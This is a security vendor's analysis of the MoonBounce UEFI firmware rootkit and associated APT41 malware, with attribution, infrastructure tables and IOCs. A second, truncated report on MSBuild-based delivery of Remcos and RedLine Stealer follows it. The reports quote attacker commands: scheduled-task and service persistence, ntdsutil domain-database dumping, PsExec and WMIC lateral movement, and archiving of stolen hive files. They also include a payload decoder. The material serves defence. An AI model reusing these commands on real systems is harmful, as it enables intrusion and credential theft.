The inspected UEFI firmware was tampered with to embed a malicious code that we dub MoonBounce; Due to its emplacement on SPI flash which is located on the motherboard instead of the hard disk, the implant is capable of persisting in the system across disk formatting or replacement; The purpose of the implant is to facilitate the deployment of user-mode malware that stages execution of further payloads downloaded from the internet; The infection chain itself does not leave any traces on the hard drive, as its components operate in memory only, thus facilitating a fileless attack with a small footprint; We detected other non-UEFI implants in the targeted network that communicated with the same infrastructure which hosted the the stager’s payload; By assessing the combination of the above findings with network infrastructure fingerprints and other TTPs exhibited by the the attackers; to the best of our knowledge the intrusion set in question can be attributed to APT41, a threat actor that’s been widely reported to be Chinese-speaking; In this report we describe in detail how the MoonBounce implant works, how it is connected to APT41, and what other traces of activity related to Chinese-speaking actors we were able to observe in the compromised network that could indicate a connection to this threat actor and the underlying campaign. 
Revisiting the current state of the art in persistent attacks In the last year, there have been several public accounts on the ongoing trend of UEFI threats.
Notable examples include the UEFI bootkit used as part of the FinSpy surveillance toolset that we reported on, the work of our colleagues from ESET on the ESPectre bootkit, and a little-known threat activity that was discovered within government organisations in the Middle East, using a UEFI bootkit of its own (briefly mentioned in our APT trends report Q3 2021 and covered in more detail in a private APT report delivered to customers of our Threat Intelligence Portal). 
The common denominator of those three cases is the fact that the UEFI components targeted for infection reside on the ESP (EFI System Partition), a storage space designated for some UEFI components, typically based in the computer’s hard drive or SSD.
The most notable elements of the ESP are the Boot Manager and OS loader, both invoked during the machine’s boot sequence and which also happen to be the subject of tampering in the case of the aforementioned bootkits. 
While all of the above were seen in use by advanced actors, a different class of bootkits raises even higher concern.
This one is made up of implants found in the UEFI firmware within the SPI flash, a non-volatile storage external to the hard drive.
Such bootkits are not only stealthier (partially because of limited visibility by security products into this hardware component), but also more difficult to mitigate: flashing a clean firmware image in place of a malicious one can prove to be more difficult than formatting a hard drive and reinstalling an OS, which would typically eliminate ESP level threats. 
MoonBounce is notable for being the third publicly revealed case of an implant from the latter class of firmware-based rootkits.
Previous cases included LoJax and MosaicRegressor, which we reported on during October 2020.
In that sense, MoonBounce marks a particular evolution in this group of threats by presenting a more complicated attack flow in comparison to its predecessors and a higher level of technical competence by its authors, who demonstrate a thorough understanding of the finer details involved in the UEFI boot process. 
Our discovery: a sophisticated implant within UEFI firmware The UEFI implant, which was detected in spring 2021 , was found to have been incorporated by the attackers into the CORE_DXE component of the firmware (also known as the DXE Foundation), which is called early on at the DXE (Driver Execution Environment) phase of the UEFI boot sequence.
Among other things, this component is responsible for initializing essential data structures and function interfaces, one of which is the EFI Boot Services Table – a set of pointers to routines that are part of the CORE_DXE image itself and are callable by other DXE drivers in the boot chain. 
The source of the infection starts with a set of hooks that intercept the execution of several functions in the EFI Boot Services Table, namely AllocatePool, CreateEventEx and ExitBootServices.
Those hooks are used to divert the flow of these functions to malicious shellcode that is appended by the attackers to the CORE_DXE image, which in turn sets up additional hooks in subsequent components of the boot chain, namely the Windows loader. 
This multistage chain of hooks facilitates the propagation of malicious code from the CORE_DXE image to other boot components during system startup, allowing the introduction of a malicious driver to the memory address space of the Windows kernel.
This driver, which runs during the initial phases of the kernel’s execution, is in charge of deploying user-mode malware by injecting it into an svchost.exe process, once the operating system is up and running.
Finally, the user mode malware reaches out to a hardcoded C&C URL (i.e. hxxp://mb.glbaitech[.]com/mboard.dll) and attempts to fetch another stage of the payload to run in memory, which we were not able to retrieve. 
The diagram below contains the outline of the stages taken from the moment the hooked Boot Services are called in the context of the DXE Foundation’s execution until the user-mode malware is deployed and run during the Operating System’s execution.
The full description of each step in the diagram, along with the analysis of both the MoonBounce driver and user-mode malware can be found in the technical document released alongside this report. 
Flow of MoonBounce execution from boot sequence to malware deployment in user space Note that at the time of writing we lack sufficient evidence to retrace how the UEFI firmware was infected in the first place.
The infection itself, however, is assumed to have occurred remotely.
While previous UEFI firmware compromises (i.e. LoJax and MosaicRegressor) manifested as additions of DXE drivers to the overall firmware image on the SPI flash, the current case exhibits a much more subtle and stealthy technique where an existing firmware component is modified to alter its behaviour.
Notably, particular functions were modified with an inline hook, meaning the replacement of the function prologue with an instruction to divert execution to a function chosen by the attacker.
This form of binary instrumentation typically requires the attacker to obtain the original image, then parse and change it to introduce malicious logic.
This would be possible for an attacker having ongoing and remote access to the targeted machine. 
Other pieces of malware on the radar In addition to MoonBounce, we found infections across multiple nodes in the same network by a known user-mode malware dubbed ScrambleCross, also known as SideWalk.
This is an in-memory implant, implemented as position-independent code, that can communicate to a C2 server in order to exchange information and stage the execution of additional plugins in memory, of which none has been sighted in the wild yet.
This malware was thoroughly covered by our colleagues at Trend Micro and ESET, so we will refer the reader to their excellent write-ups to understand its internals better. 
The position-independent code constituting ScrambleCross can be loaded in one of two ways, the first being a C++ DLL named StealthVector.
It obtains the ScrambleCross shellcode by applying a modified ChaCha20 algorithm on an encrypted blob, which may reside as an additional file on disk or be embedded in the loader itself.
We detected both variants of this loader in the network in question. 
StealthVector gets loaded through the introduction of a modified benign system DLL, in which the import address table is patched to append the malware’s DLL as a dependency.
In one case, we observed such altered wbemcomn.dll (MD5: C3B153347AED27435A18E789D8B67E0A) file, which originally facilitates the functionality of WMI in Windows and was located in the directory %SYSTEM%\wbem.
As a consequence, when the WMI service was initiated, the rogue version of this DLL forced the loading of a StealthVector image named wmiwk.dll. 
Appended IAT entry to a rogue wbemcomn.dll file which forces the loading of StealthVector upon initiation of the WMI service The table below specifies all instances of StealthVector that we detected in the targeted network, along with timestamp artefacts that might point to the date of their creation. 
Loader Filename Loader MD5 Shellcode Filename C&C Address Compilation Timestamp wbwkem.dll 4D5EB9F6F501B4F6EDF981A3C6C4D6FA compwm.bin dev.kinopoisksu[.]com Friday, 12.06.2020 08:25:02 UTC wkbem.dll E7155C355C90DC113476DDCF765B187D pcomnl.bin Unknown Tuesday, 24.03.2020 09:09:21 UTC wmiwk.dll 899608DE6B59C63B4AE219C3C13502F5 wmipl.dll ns.glbaitech[.]com Saturday, 20.02.2021 06:45:18 UTC c_20344.nls 4EF90CEEF2CC9FF3121B34A9891BB28D – 217.69.10[.]104 Tuesday, 24.03.2020 09:09:21 UTC c_20334.nls CFF2772C44F6F86661AB0A4FFBF86833 – st.kinopoisksu[.]com Tuesday, 24.03.2020 09:09:21 UTC Another loader that we detected and is commonly used to load ScrambleCross is .NET based, referred to as StealthMutant.
It works by decrypting a shellcode BLOB with AES-256 and injecting it to the address space of another process.
The injected process in every case we observed was msdt.exe (Microsoft Diagnostic Troubleshooting Wizard). 
StealthMutant is launched in one of two ways, which were partially described in other reports as well.
The first way is by executing a launcher utility with the filename System.Mail.Service.dll (MD5: 5F9020983A61446A77AF1976247C443D) through the command line as a service.
This is outlined in the following commands typed by the attackers on one of the compromised systems:net start "iscsiwmi" sc stop iscsiwmi sc delete iscsiwmi reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v
"iscsiwmi" /t
REG_MULTI_SZ /d
"iscsiwmi" /f sc create "iscsiwmi" binPath= "$system32\svchost.exe -k iscsiwmi" type= share start= auto error= ignore DisplayName= "iscsiwmi" SC failure "iscsiwmi" reset= 86400 actions= restart/60000/restart/60000/restart/60000 sc description "iscsiwmi" ""iSCSI WMI Classes That Manage Initiators, Ports, Sessions and Connections"" reg add "HKLM\SYSTEM\CurrentControlSet\Services\iscsiwmi\Parameters" /f reg add "HKLM\SYSTEM\CurrentControlSet\Services\iscsiwmi\Parameters" /v
"ServiceDll" /t
REG_EXPAND_SZ /d "$windir\Microsoft.
NET\Framework64\v4.0.30319\System.
Mail.Service.dll" /f net start "iscsiwmi" The launching utility in turn uses the .NET InstallUtil.exe application in order to execute the StealthMutant image, which has the filename Microsoft.Service.Watch.targets, and providing it with the encrypted ScrambleCross shellcode as an argument from a file named MstUtil.exe.config.
The utility itself is a basic C++ program that achieves the aforementioned goal by issuing the following command line using the WinExec API:C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
/logfile= /LogToConsole
=false /ConfigFile=MstUtil.exe.config /U C:\Windows\Microsoft.
NET\Framework64\v4.0.30319\Microsoft.
Service.
Watch.targets 
The second way to execute StealthMutant is through the creation of a scheduled task via a Windows batch script file named schtask.bat, as outlined below:@echo off cd /d
"%~dp0" copy /Y
Microsoft.Service.Watch.targets
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.
Watch.targets" copy /Y
MstUtil.exe.config "C:\Windows\Microsoft.
NET\Framework64\v4.0.30319\MstUtil.exe.config" schtasks /create
/TN "\Microsoft\Windows\UNP\UNPRefreshListTask" /SC ONSTART /TR
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile=
/LogToConsole
Watch.targets"
/F /DELAY 0000:02 /RU SYSTEM /RL HIGHEST schtasks /run
/TN "\Microsoft\Windows\UNP\UNPRefreshListTask" The following table lists known StealthMutant loader IOCs, together with their corresponding ScrambleCross shellcode files and contacted C2 addresses.
It’s worth noting that most of the ScrambleCross shellcodes (loaded by both StealthMutant and StealthVector) reached out to the same server (i.e. ns.glbaitech[.]com) and that StealthMutant was observed in this campaign only from February, 2021. 
Loader MD5 C&C Address Compilation Timestamp 0603C8AAECBDC523CBD3495E93AFB20C 92.38.178[.]246 Tuesday, 23.03.2021 08:00:44 UTC ns.glbaitech[.]com 8C7598061D1E8741B8389A80BFD8B8F5 
ns.glbaitech[.]com Saturday, 20.02.2021 03:27:42 UTC F9F9D6FB3CB94B1CDF9E437141B59E16 ns.glbaitech[.]com Wednesday, 08.12.2021 07:07:28
UTC 
In addition to the above components, we found other stagers and post-exploitation malware implants during our research, some of which were attributed to or have been used by known Chinese-speaking threat actors: Microcin: a backdoor typically used by the SixLittleMonkeys threat actor, which we have been tracking since 2016.
It is worth noting that since its inception, the SixLittleMonkeys group has been using Microcin against various targets, partly against high-profile entities based in Russia and Central Asia. 
The implants we observed in this campaign are shipped as DLLs that ought to run in the context of exe, with the primary intent of reading a C2 address from an encrypted configuration file stored in %WINDIR%\debug\netlogon.cfg and reaching out to the server to obtain a further payload.
Interestingly, the Trojan holds a scheduling algorithm that would skip any work on Saturdays, checking the local time every hour to determine if Saturday has passed. 
Mimikat_ssp: a publicly available post-exploitation tool used to dump credentials and security secrets from exe, also used widely by various Chinese-speaking actors (e.g. GhostEmperor, which we reported on). 
Go implant: a formerly unknown backdoor used to contact a C2 server using a RESTful API, where a combination of a hardcoded IP address and a hypermedia directory path on the underlying server are used for information exchange.
Both the IP and the server directory path are encrypted with AES-128 using a base64 encoded key stored in the backdoor’s image.
The IP and directory path tuple are used during execution for: Initialising communications with the server; Sending information from the infected host; Requesting a specific server path containing a command for execution and downloading it; 
Sending back the result of the command’s execution to the C2 server. 
The commands retrieved from the server are also encrypted with AES-128, with the key stored in the command’s file itself.
Command execution results are then encrypted using the same key.
We found the following list of supported commands: Get list of drives; Get content list from a specified directory; Download a file from the C2 server; Write text to a given *.bat file and execute it; Run a shell command. 
It is important to note that we could not conclusively tie most of those additional pieces of malware to the intrusion set related to MoonBounce, with the exception of Microcin, where some timeline artefacts coincide with other events related to ScrambleCross, as outlined in the figure below.
This suggests a low-confidence connection between Microcin and MoonBounce and may indicate usage of shared resources between SixLittleMonkeys and APT41 or involvement of the former’s operators in the MoonBounce activity. 
Timeline of events related to artefacts found in the network containing the MoonBounce-infected machine Who were the targets? 
Currently, our detections indicate a very targeted nature of the attack – the presence of the firmware rootkit was detected in a single case.
Other affiliated malicious samples (e.g. ScrambleCross and its loaders) were found on multiple other machines in the same network range.
In addition, we found several other victims of an undetermined nature with the same versions of ScrambleCross reaching out to the same command and control infrastructure.
One particular target corresponds to an organization in control of several enterprises dealing with transport technology. 
What were the attackers trying to achieve? 
We traced some of the commands executed by the attackers after gaining a foothold in the network, which point to lateral movement and exfiltration of information from particular machines.
This aligns in profile with some of the previous operations by APT41, wherein intrusions were typically made to intervene in the targeted companies’ supply chain, or to heist sensitive intellectual property and personally identifiable information.
The usage of the UEFI implant in particular indicates the actor’s aim to establish a longstanding foothold within the network, as would be expected in an ongoing espionage activity. 
The following are examples of command lines that portray some of the methods and actions taken by the operators of this threat activity to achieve their goals: Attempts to enumerate hosts and gather network information: cmd /C
"C: & cd \ & whoami" cmd /C
"C: & cd \ & net view" cmd /C
"C: & cd \ & -setcp 866" cmd /C
"C: & cd \ & netstat -ano" cmd /C
"C: & cd \ & dir $temp\ /od" cmd /C
"C: & cd \ & arp -a" cmd /C
"C: & cd \ & tasklist" cmd /C
"C: & cd \ & tracert <redacted_internal_ip>" cmd /C
"C: & cd \ & net use \\<redacted_internal_ip> /u:<redacted_username> <redacted_password>" cmd /C
"C: & cd \ & net view \\<redacted_internal_ip>" cmd /C
"C: & cd \ & ping -n 1 -a <redacted_internal_ip>" cmd /C
"C: & cd \ & net use * /d /y" cmd /C
"C: & cd \ & systeminfo" Copying of files across SMB shares, followed by an attempt to dump the Active Directory domain database (tid): cmd /C
"C: & cd \ & echo ntdsutil \"ac
i ntds\" \"ifm\" \"create full $temp\1\\\" q q >$temp\a.bat cmd /C
"C: & cd \ & type $temp\a.bat cmd /C
"C: & cd \ & move $temp\a.bat \\<redacted_internal_ip>\c$\windows\temp\\ Usage of the Sysinternals Psexec tool for remote command execution in the network (as the renamed version tmp): $temp\TS_P61S.tmp -accepteula -d -s \\<redacted_internal_ip1>\ cmd /c
"arp -a >$temp\TS_P34H.tmp" $temp\TS_P61S.tmp -accepteula -d -s \\<redacted_internal_ip2>\ cmd /c "ping <redacted_internal_ip2> -a -n
2>$temp\TS_P34H.tmp" $temp\TS_P61S.tmp -accepteula -d -s \\<redacted_internal_ip3>\ cmd /c "ping -n 2 -a <redacted_internal_ip2>>$temp\TS_P34H.tmp" Usage of WMI for remote command execution: wmic /node:<redacted_internal_ip1> /user:<redacted_group>\<redacted_user>
/password:<readcted_password> process call create "cmd /c ping -n 1 -a <redacted_internal_ip4> >$temp\a.tmp wmic /node:<redacted_internal_ip2> /user:<redacted_group>\<redacted_user>
/password:<readcted_password> process call create "cmd /c netstat -ano >$temp\a.tmp wmic /node:<redacted_internal_ip2> /user:<redacted_group>\<redacted_user>
/password:<readcted_password> process call create "cmd /c tracert <redacted_internal_ip4>>$temp\a.tmp wmic /node:<redacted_internal_ip3> /user:<redacted_group>\<redacted_user>
/password:<readcted_password> process call create "cmd /c ipconfig /all
>$temp\a.tmp wmic /node:<redacted_internal_ip3> /user:<redacted_group>\<redacted_user
> /password:<readcted_password> process call create "cmd /c qwinsta >$temp\a.tmp wmic /node:<redacted_internal_ip3> /user:<redacted_group>\<redacted_user>
/password:<readcted_password> process call create "cmd /c net user administrator >$temp\a.tmp wmic /node:<redacted_internal_ip3> /user:<redacted_group>\<redacted_user>
/password:<readcted_password> process call create "cmd /c net user admin >$temp\a.tmp Removal of artefacts from the system: cmd /C
"C: & cd \ & dir $temp\*.hive" cmd /C
"C: & cd \ & del $temp\*.hive" cmd /C
"C: & cd \ & dir $temp\*.log" cmd /C
"C: & cd \ & type $temp\silconfig.log" File archiving of remotely collected files, some of which contain *.hive files, possibly for LSA secrets dumping, with the exe command line utility: cmd /C
"C: & cd \ & $temp\rar.exe a -r wef.rar \\<redacted_internal_ip1>\c$\windows\temp\1 -hp2wsxcde34rfv7788.
" c:\windows\temp\rar.exe a -r c:\windows\temp\873.rar \\<redacted_internal_ip2>\c$\windows\temp\*.hive -hp5tgbnhy67ujm3256 Network infrastructure The main cluster of infrastructure serving the activity of the UEFI implant and ScrambleCross implants is outlined in the table below.
Note that the attackers maintained the infrastructure from at least March 2020, with some servers seemingly still active at the end of 2021 .
During the time the actor switched between multiple hosting providers, resulting in a scattered infrastructure across several ASNs. 
Domain IP ASN mb.glbaitech[.]com 188.166.61[.]146 AS14061 – DIGITALOCEAN-ASN ns.glbaitech[.]com 188.166.61[.]146 AS14061 – DIGITALOCEAN-ASN 172.107.231[.]236 AS40676 dev.kinopoisksu[.]com 172.107.231[.]236 AS40676 193.29.57[.]161 AS48314 – IP-PROJECTS st.kinopoisksu[.]com 136.244.100[.]127 AS20473 – AS-CHOOPA – 217.69.10[.]104 AS20473 – AS-CHOOPA – 92.38.178[.]246 AS202422 –
GHOST A careful inspection of the infrastructure shows multiple connections between the servers.
It is evident that MoonBounce’s user-mode stager and a few ScrambleCross instances reached out to a single domain, which resolved to the same IP at one point.
In addition, there were several overlaps in IPs to which the domains resolved as outlined in the figure below, including one IP that was used to park two domains at different points in time. 
Connections between infrastructure elements of MoonBounce and ScrambleCross implants found on the same network Another important commonality is a unique self-signed SSL certificate, exhibited by multiple servers in this campaign (and only a few dozen others in the wild), which represents a noteworthy fingerprint of the attacker’s network activity. 
In addition to the above cluster, we detected two servers related to Microcin’s activity on the same network: Domain IP ASN m.necemarket[.]com 172.105.94[.]67 AS63949 – LINODE holdmem.dbhubspi[.]com 5.188.93[.]132 AS202422 – G-Core Labs Who is behind the MoonBounce attack? 
To the best of our knowledge, the activity described in this report can be attributed to a group widely known as APT41, or an actor closely affiliated to it, with medium to high confidence.
In part, our findings align with multiple public accounts from the previous year of either APT41 or other threat actors, namely Earth Baku and SparklingGoblin, which are believed to be alternative names for APT41 or share significant resources and TTPs with it. 
Our conclusion, in particular, is done based on the following factors: The loading schemes for ScrambleCross, including the usage of StealthVector and StealthMutant in the infection chain, are identical to those observed leveraged by Earth Baku and SparklingGoblin.
Apart from the loaders themselves, their launchers seem identical.
The attackers used the unique TTP of initiating the loader execution through exe in all cases observed by us.
Particularly Install.bat, as used by Earth Baku and described in the public report by Trend Micro mentioned earlier, is highly similar to the sequence of commands used to execute the InstallUtil launcher in our case. 
The ScrambleCross malware itself, which has been reported in use with both Earth Baku and SparklingGoblin, is considered a variant of CROSSWALK, a piece of malware that was described originally by Mandiant as an APT41 tool and remains distinct to the group, to the best of our knowledge. 
A unique certificate retrieved from multiple ScrambleCross C2 servers in the campaign described in this report was sent as a response in a few other dozen servers in the wild, a few of them have been previously reported by the FBI as being part of an APT41-owned infrastructure. 
Additionally, the following observations are worth mentioning: The user-mode malware stager deployed by the UEFI implant contains a scheduling logic that is somewhat similar to one seen in Microcin samples (some of which were also found on infected hosts in this campaign).
This suggests that these groups may be related through shared resources or a prime contractor. 
The said scheduling algorithm found in the stager can take a 672-bit bitmask to determine when the malware should start beaconing the C2 server in an attempt to retrieve the payload, whereby the scheduled working time can be decided in a granularity of 15-minute slots (i.e. the stager checks if it is supposed to run in a particular slot out of the 672 possibilities that constitute a full week, or alternatively sleep for 10 seconds before checking if it has reached a dedicated working slot again).
A similar scheduling methodology occurs in the case of Microcin, but with a bitmask that simply represents the days of the week on which the malware ought to be active. 
Scheduling code used in MoonBounce’s user-mode stager 
The Mimikat_ssp tool found on a few machines in the targeted network has been seen in use by multiple Chinese-speaking threat actors in the past.
One recent example is its use in the campaigns of GhostEmperor, as described in a previous report. 
Some elements of shellcode leveraged in MoonBounce were spotted in an old rootkit that was part of a malicious framework dubbed xTalker, which has been seen in the wild since at least 2013, alongside several malware families affiliated to known actors, e.g. NetTraveler, Enfal and Microcin.
It was prominently used against Russian-speaking targets including military, governmental entities and think-tanks. 
Both components shared a similar name-hashing algorithm, which is outlined below, along with unique corresponding function name hashes (e.g. 0x311B83F, the name hash of ExAllocatePool) that were not seen in use elsewhere in the wild. 
Name-hashing algorithm used identically in both MoonBounce and xTalker’s rootkit In addition, both pieces of code used a technique of replacing magic marker values within shellcode buffers with pointer addresses during runtime.
MoonBounce’s code used the marker 0x1122334455667788, while the xTalker rootkit’s code used 0x1234567812345678. 
Magic marker values replaced during execution within shellcodes in xTalker’s rootkit and MoonBounce In the case of xTalker, the above code elements were found within shellcode intended to be staged through an MBR bootkit.
However, it is not clear to what extent it was actually used.
This may suggest that the MoonBounce and xTalker codes were authored by the same, or a closely affiliated, developer. 
Conclusion In September 2020, the US Department of Justice released a series of indictments against members of the APT41 group, charging them with a high number of computer intrusions against a variety of targets, both in the private and public sectors, some of which included high-profile supply chain attacks.
The intrusion set described in this report, and in other public accounts we referred to, shows that the group did not cease to be active despite these legal proceedings. 
Moreover, it is evident that the group maintains a high level of proficiency and sophistication in the development of its toolset, gaining a foothold in new areas like UEFI firmware.
In this sense, the group has introduced its own innovation to this landscape – patching an existing benign core component in the firmware (rather than adding a new driver to it), thereby turning the UEFI firmware into a highly stealthy and persistent storage for malware in the system. 
Following previous predictions, we can now say that UEFI threats are gradually becoming a norm.
With this in mind, vendors are taking more precautions to mitigate attacks like MoonBounce, for example by enabling Secure Boot by default.
We assess that, in this ongoing arms race, attacks against UEFI will continue to proliferate, with attackers evolving and finding ways to exploit and bypass current security measures. 
As a safety measure against this attack and similar ones, it is recommended to update the UEFI firmware regularly and verify that BootGuard, where applicable, is enabled.
Likewise, enabling Trust Platform Modules, in case a corresponding hardware is supported on the machine, is also advisable.
On top of all, a security product that has visibility into the firmware images should add an extra layer of security, alerting the user on a potential compromise if such occurs. 
MoonBounce’ indicators of compromise EFI Rootkit – Malicious CORE_DXE D94962550B90DDB3F80F62BD96BD9858 Modified WMI DLL Launcher C3B153347AED27435A18E789D8B67E0A StealthVector 4D5EB9F6F501B4F6EDF981A3C6C4D6FA E7155C355C90DC113476DDCF765B187D 899608DE6B59C63B4AE219C3C13502F5 4EF90CEEF2CC9FF3121B34A9891BB28D CFF2772C44F6F86661AB0A4FFBF86833 InstallUtil Launcher 5F9020983A61446A77AF1976247C443D StealthMutant 0603C8AAECBDC523CBD3495E93AFB20C 8C7598061D1E8741B8389A80BFD8B8F5 F9F9D6FB3CB94B1CDF9E437141B59E16 Microcin 5FE6CE9C48D0AE98EC2CA1EC9759AAD9 50FF717A8E3106DDBF00FB42212879C5 D98614600775781673B6DF397CC4F476 Go Implant C9B250099E2DD27BB4170836AC480FE0 97EF7B8FCDCB0C0D9FBB93D0F7E6E3B6 Mimikat_SSP 4E4388D7967E0433D400C60475974D50 5F1C7602688E67F299F5BD533FA07880 xTalker Rootkit 45E862964EF4EFDEA181F3927D20E96D 4BC82105403974AA24BF02CFB66B8F7C Domains and IPs mb.glbaitech[.]com – MoonBounce ns.glbaitech[.]com – ScrambleCross dev.kinopoisksu[.]com – ScrambleCross st.kinopoisksu[.]com – ScrambleCross 188.166.61[.]146 – ScrambleCross 172.107.231[.]236 – ScrambleCross 193.29.57[.]161 – ScrambleCross 136.244.100[.]127 – ScrambleCross 217.69.10[.]104 – ScrambleCross 92.38.178[.]246 – ScrambleCross m.necemarket[.]com – Microcin 172.105.94[.]67 – Microcin holdmem.dbhubspi[.]com – Microcin 5.188.93[.]132 – Go malware 5.189.222[.]33 – Go malware 5.183.103[.]122 – Go malware 5.188.108[.]228 – Go malware 45.128.132[.]6 – Go malware 92.223.105[.]246 – Go malware 5.183.101[.]21 – Go malware 5.183.101[.]114 – Go malware 45.128.135[.]15 – Go malware 5.188.108[.]22 – Go malware 70.34.201[.]16 – Go malware File Names wbwkem.dll – StealthVector wkbem.dll – StealthVector wmiwk.dll – StealthVector C_20344.nls – StealthVector C_20334.nls – StealthVector compwm.bin – ScrambleCross Shellcode pcomnl.bin – ScrambleCross Shellcode wmipl.dll – ScrambleCross encrypted shellcode Microsoft.Service.Watch.targets – StealthMutant MstUtil.exe.config –
ScrambleCross encrypted shellcode System.Mail.Service.dll – InstallUtil launcher for StealthMutant schtask.bat – Batch launcher for StealthMutant CmluaApi.dll – Microcin ScrambleCross Mutexes Global\GouZUAkmtdpUmves Global\PtUojBxCOZGVmQQn Global\EGuUCpyYIJRTQJAV Global\YCtiqMgRrpLGbfDo 
title: Threat Actors Use MSBuild to Deliver RATs Filelessly url: https://www.anomali.com/blog/threat-actors-use-msbuild-to-deliver-rats-filelessly Authored by: Tara Gould and Gage Mele Key Findings Anomali Threat Research identified a campaign in which threat actors used Microsoft Build Engine (MSBuild) to filelessly deliver Remcos remote access tool (RAT) and password-stealing malware commonly known as RedLine Stealer This campaign, which has low or zero detections on antivirus tools, appears to have begun in April 2021 and was still ongoing as of May 11, 2021. 
We were unable to determine how the .proj files were distributed, and are unable to make a confident assessment on attribution because both RemcosRAT and RedLine Stealer are commodity malware. 
Overview Anomali Threat Research discovered a campaign in which threat actors used MSBuild - a tool used for building apps and gives users an XML schema “that controls how the build platform processes and builds software” - to filelessly deliver RemcosRAT, and RedLine stealer using callbacks.[1]
The malicious MSBuild files we observed in this campaign contained encoded executables and shellcode, with some, hosted on Russian image-hosting site, “joxi[.]net.”
While we were unable to determine the distribution method of the .proj files, the objective of these files was to execute either Remcos or RedLine Stealer.
The majority of the samples we analyzed deliver Remcos as the final payload. 
Figure 1 - Infection chain Technical Analysis MSBuild MSBuild is a development tool used for building applications, especially where Visual Studio is not installed.[2] MSBuild uses XML project files that contain the specifications to compile the project and, within the configuration file, the “UsingTask” element defines the task that will be compiled by MSBuild.
In addition, MSBuild has an inline task feature that enables code to be specified and compiled by MSBuild and executed in memory.
This ability for code to be executed in memory is what enables threat actors to use MSBuild in fileless attacks. 
A fileless attack is a technique used by threat actors to compromise a machine while limiting the chances of being detected.[3]
Fileless malware typically uses a legitimate application to load the malware into memory, therefore leaving no traces of infection on the machine and making it difficult to detect.
An analysis by network security vendor WatchGuard released in 2021 showed a 888% increase in fileless attacks from 2019 to 2020, illustrating the massive growth in the use of this attack technique, which is likely related to threat actor confidence that such attacks will be successful.[4] MSBuild Project File (.proj) Analysis Analyzed File – imaadp32.proj MD5 – 45c94900f312b2002c9c445bd8a59ae6 The file we analyzed is called “imaadp32.proj,” and as shown in Figure 2 below, is an MSBuild project file (.proj).
For persistence, mshta is used to execute a vbscript that runs the project file, with a shortcut file (.lnk) added to the startup folder (Figure 3). 
Figure 2 - MSBuild Project Schema for immadp32.proj Figure 3 - .lnk
File Created in Startup Folder Following the creation of persistence, two large arrays of decimal bytes were decoded by the function shown in Figure 4. Figure 4 - Decoding Function Porting the decoding function to Python, we created a script (Figure 5 below).
By using the variable “dec_list” to contain the decimal to be converted, and the variable “key” representing the string found at the end of decimal, we decoded the function. 
def decode_array(dec_list, key): key_array =
[] position_array =
[] for position in list(range(256)): key_array.append(key[position % len(key)]) position_array.append(position) 
xxZmgLbpuJ = 0 for position in list(range(256)): xxZmgLbpuJ
= (xxZmgLbpuJ + position_array[position] + ord(key_array[position]))
% 256 YAFIh = position_array[position] position_array[position] = position_array[xxZmgLbpuJ] position_array[xxZmgLbpuJ] = YAFIh DmqRsaOvxUH
= 0 
xxZmgLbpuJ
= 0 new_array =
[] for position in list(range(len(dec_list))): DmqRsaOvxUH
+= 1 DmqRsaOvxUH
%= 256 xxZmgLbpuJ
+= position_array[DmqRsaOvxUH] 
xxZmgLbpuJ %= 256 YAFIh = position_array[DmqRsaOvxUH] position_array[DmqRsaOvxUH] = position_array[xxZmgLbpuJ] position_array[xxZmgLbpuJ] = YAFIh new_array.append(dec_list[position] ^
position_array[((position_array[DmqRsaOvxUH]
+ position_array[xxZmgLbpuJ])
% 256)]) return new_array Figure 5 - Python Script to Decode 
The output decimal list from this function was then converted from bytes, resulting in an executable for the first block and shellcode for the second block. 
Shellcode The malware and shellcode were allocated memory in the process space using VirtualAlloc.
After being copied into memory, the shellcode was executed using the callback function pointer in CallWindowProc, shown in Figure 6 below.
Other samples leverage the function Delegate.
DynamicInvoke instead. 
Figure 6 - Shellcode and Payload Being Loaded Into Memory Figure 7 - Encoded shellcode in Project File The shellcode (encoded shown in Figure 7 above) calls, shown in Figure 8 below, were mainly: LoadLibraryW, VirtualAlloc, CreateProccessW, and ZwUnmapViewOfSection.
LoadLibraryW loads the module, VirtualAlloc allocates the memory, CreateProcessW created a process, and ZwUnmapViewOfSection is used to unmap memory from a virtual space.
These were used to inject the payload into process memory. 
Figure 8 - Calls made by the shellcode Payloads RemcosRAT Analyzed File – MD5 – 04fc0ca4062dd014d64dcb2fe8dbc966 The payload from the project files was a remote access tool (RAT) called Remcos.
Remcos is a commercial software created by Breaking Security that, according to their user manual, can be used for remote control, remote admin, remote anti-theft, remote support and pentesting.[5]
However, Remcos has often been used by threat actors for malicious purposes.
The software, written in C++, enables full access to the infected machine with features including, but not limited to: Anti-AV Credential harvesting Gathering system information Keylogging Persistence Screen capture Script execution The themes used by actors to distribute Remcos have varied, including changes designed to adapt to themes or timeframes.
For example, recent Remcos campaigns were observed utilizing Tax Day lures.[6]
The version used in this campaign was 2.6.0, which was released in July 2020 (Figure 9).
Additional functions Remcos has been known to utilize are shown in Table 1 below.
The persistence technique is simply adding a run registry key for persistence (Figure 11).
Remcos has also been observed using its “Watchdog” feature to restart the RAT if it is terminated (Figure 12). 
Figure 9 - Remcos Version 2.6.0 Being Used Figure 10 - connecting to C2 Figure 11 - Adds Run Registry Key for Persistence Figure 12 - Watchdog Module Figure 12 shows the “Watchdog” module which restarts Remcos in the event the program is terminated. 
Table 1 - Remcos 2.6.0 Features Remote Scripting Notifications 
Webcam Capture Remote Command Line Clear Logins Remote Chat File Manager Remote Input Microphone Capture SOCKS Proxy Keylogger Login Cleaner Screen Logger Local Utilities Browser History Registry Editor Password Recovery Visibility mode RedLine Stealer Analyzed File – rehoboams.exe MD5 – 6d3e8a2802848d259a3baaaa78701b97 
In a similar MSBuild project file to the Remcos dropping .proj file, we found another project file named “vwnfmo.lnk“ where RedLine Stealer was dropped instead of Remcos, shown in Figure 13 below.
RedLine Stealer is written in .NET and has been observed stealing multiple types of data (full list shown in Table 2 below), including: : Cookies Credentials (chat clients, VPNs, crypto wallets, browser ) 
Crypto wallet NordVPN (existence of and credentials) Stored web browser information (credit card, username, and password) 
System Information RedLine will search for the existence of multiple products that include cryptocurrency software, messaging apps, VPNs, and web browsers (full list shown in Table 2 below). 
Figure 13 - RedLine .NET
Information Stealer Figure 14 - RedLine Functions Figure 15 - Checks for NordVPN Installation Figure 15 above shows RedLine checking for NordVPN on the machine.
